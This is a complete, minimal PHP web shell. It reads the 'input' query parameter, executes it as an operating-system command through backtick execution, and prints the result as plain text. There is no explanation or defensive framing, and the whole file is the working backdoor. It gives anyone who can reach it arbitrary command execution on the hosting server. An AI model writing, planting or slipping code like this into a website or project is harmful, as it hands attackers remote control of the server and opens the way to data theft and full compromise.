<?php

header("content-type: text/plain");

$input = $_GET['input'];
$output = `$input`;
echo $output;

?>